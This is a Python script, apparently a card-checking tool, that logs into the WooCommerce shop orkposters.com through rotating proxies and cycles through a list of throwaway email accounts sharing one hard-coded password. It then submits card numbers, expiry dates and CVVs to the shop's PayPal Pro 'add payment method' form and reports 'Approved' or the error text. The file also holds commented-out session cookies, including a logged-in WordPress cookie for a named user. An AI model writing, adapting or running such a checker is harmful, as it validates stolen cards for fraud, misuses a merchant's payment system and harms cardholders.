import requests
from bs4 import BeautifulSoup
from proxy import proxies
def getstr(data, start, end):
    try:
        return data.split(start)[1].split(end)[0]
    except:
        return ''
current_index = 0

def login_user():
    global current_index
    users = ['izayra2@code-gmail.com', 'yimlumekke@gufum.com','milmavekka@gufum.com',
             'nurkejastu@gufum.com','pukobyfi@teleg.eu','jyxupuma@polkaroad.net',
             'vivosiru@azuretechtalk.net','hegudu@polkaroad.net','newagage@logsmarter.net',
             'rewoty@clip.lat','dntqo2suxq@qacmjeq.com']
    
    username = users[current_index]
    
    current_index = (current_index + 1) % len(users)
    
    return username

async def payflow_Auth1(cc,mm,yy,cvv):
    proxy = proxies()
    r = requests.Session()
    r.proxies = proxy
    user = login_user()
    headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            # 'cookie': '_gcl_au=1.1.978090588.1728717320; wordpress_logged_in_f0e7494c56f2d2b3c2a974f7d486bb17=albedo.jones%7C1729927052%7CHYBYULkURLXwtI8EW5iAMGsoBPMG6grrtk0Afi8AHWw%7C8118edda529dffa68bdbce879cd363b9d8493a730ccde55bee441c6d7238dfb7; _gid=GA1.2.2061906543.1729065427; _gat_gtag_UA_54929454_1=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-16%2007%3A27%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Forkposters.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-10-16%2007%3A27%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Forkposters.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Forkposters.com%2Fmy-account%2F; _ga_GV5RKVRT9X=GS1.1.1729065427.2.1.1729065439.0.0.0; _ga=GA1.1.2079664755.1728717320',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

    response = r.get('https://orkposters.com/my-account/',  headers=headers)
    login_nonce = getstr(response.text, 'woocommerce-login-nonce" value="', '"')
    headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': '_gcl_au=1.1.978090588.1728717320; wordpress_logged_in_f0e7494c56f2d2b3c2a974f7d486bb17=albedo.jones%7C1729927052%7CHYBYULkURLXwtI8EW5iAMGsoBPMG6grrtk0Afi8AHWw%7C8118edda529dffa68bdbce879cd363b9d8493a730ccde55bee441c6d7238dfb7; _gid=GA1.2.2061906543.1729065427; _gat_gtag_UA_54929454_1=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-16%2007%3A27%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Forkposters.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-10-16%2007%3A27%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Forkposters.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Forkposters.com%2Fmy-account%2F; _ga_GV5RKVRT9X=GS1.1.1729065427.2.1.1729065449.0.0.0; _ga=GA1.1.2079664755.1728717320',
            'origin': 'https://orkposters.com',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://orkposters.com/my-account/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

    data = {
            'username': user,
            'password': 'Ayanpro@087',
            'woocommerce-login-nonce': login_nonce,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in',
        }

    response = r.post('https://orkposters.com/my-account/', headers=headers, data=data)
    headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            # 'cookie': '_gcl_au=1.1.978090588.1728717320; _gid=GA1.2.2061906543.1729065427; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-16%2007%3A27%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Forkposters.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-10-16%2007%3A27%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Forkposters.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Safari%2F537.36; wordpress_logged_in_f0e7494c56f2d2b3c2a974f7d486bb17=albedo.jones%7C1729238267%7CwuyiYlubZ0cj4V2Ykv9rnC5GIr3qN2r4XVMF6F1k0N7%7Ca7d13721095b745593881cfe277c2d8f10404d4c1db3746c2eed9572767854a4; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Forkposters.com%2Fmy-account%2Fpayment-methods%2F; _gat_gtag_UA_54929454_1=1; _ga_GV5RKVRT9X=GS1.1.1729065427.2.1.1729066974.0.0.0; _ga=GA1.1.2079664755.1728717320',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://orkposters.com/my-account/payment-methods/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

    response = r.get('https://orkposters.com/my-account/add-payment-method/', headers=headers)
    payment_nonce = getstr(response.text, 'woocommerce-add-payment-method-nonce" value="', '"')
    headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': '_gcl_au=1.1.978090588.1728717320; _gid=GA1.2.2061906543.1729065427; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-16%2007%3A27%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Forkposters.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-10-16%2007%3A27%3A19%7C%7C%7Cep%3Dhttps%3A%2F%2Forkposters.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Safari%2F537.36; wordpress_logged_in_f0e7494c56f2d2b3c2a974f7d486bb17=albedo.jones%7C1729238267%7CwuyiYlubZ0cj4V2Ykv9rnC5GIr3qN2r4XVMF6F1k0N7%7Ca7d13721095b745593881cfe277c2d8f10404d4c1db3746c2eed9572767854a4; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Forkposters.com%2Fmy-account%2Fadd-payment-method%2F; _ga=GA1.1.2079664755.1728717320; _ga_GV5RKVRT9X=GS1.1.1729065427.2.1.1729067336.0.0.0',
            'origin': 'https://orkposters.com',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': 'https://orkposters.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        }

    data = {
            'payment_method': 'paypal_pro',
            'paypal_pro-card-number': cc,
            'paypal_pro_card_expiration_month': mm,
            'paypal_pro_card_expiration_year': yy,
            'paypal_pro-card-cvc': cvv,
            'woocommerce-add-payment-method-nonce': payment_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

    response = r.post('https://orkposters.com/my-account/add-payment-method/', headers=headers, data=data)
    soup = BeautifulSoup(response.text, 'html.parser')
    try:
            error_message = soup.find('ul', class_='woocommerce-error')
            
            if error_message:
                return error_message.find('li').text.strip()
            
            success_message = soup.find('div', class_='woocommerce-message')
            
            if success_message and 'Payment method successfully added' in success_message.text.strip():
                return 'Approved'
            else:
                return 'Unknown response'

    except Exception as e:
            return str(e)

